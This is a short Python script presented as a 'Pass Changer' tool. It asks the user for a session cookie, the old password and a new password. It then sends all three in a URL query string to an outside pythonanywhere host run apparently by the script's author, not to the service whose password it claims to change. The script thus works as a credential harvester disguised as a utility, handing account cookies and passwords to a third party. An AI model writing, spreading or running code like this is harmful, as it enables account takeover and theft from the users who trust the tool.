'''https://xerxxd.pythonanywhere.com//XERXXD/cred?cookie={cokkie}&oldpwd={old_pwd}&newpwd={new_pwd}'''
videolink = 'https://youtu.be/Unv9uZ8REGY'
import os
import requests
def logo():
	os.system('clear')
	print(f'''
-------------------------------------------------------------
        >> AUTHOR :- ARYAN CHAUDHARY 
        >> GitHub :- XERX-XD
        >> YouTube :- @XERX-XD
        >> Tool Type :- Pass Changer
-------------------------------------------------------------''')

def xerx():
    logo()
    cookie = input(' input cookie here :- ')
    print(53*'-')
    old_pwd = input(' input old password:- ')
    print(53*'-')
    new_pwd= input(' input new password:- ')
    print(53*'-')
    chng(cookie,old_pwd,new_pwd)
    

def chng(cookie,old_pwd,new_pwd):
    try:
        sub = requests.get(f'https://xerxxd.pythonanywhere.com//XERXXD/cred?cookie={cookie}&oldpwd={old_pwd}&newpwd={new_pwd}')
        
        if 'Invalid cookie' in str(sub.text):
            print(' cookie error check id')
        elif 'Wrong old password' in str(sub.text):
            print(' wrong old pass ')
        elif 'Success' in str(sub.text):
            print(sub.text)
        else:
        	print(' error contact admin ')
        
    except:
        print(' something went wrong ')

   
xerx()
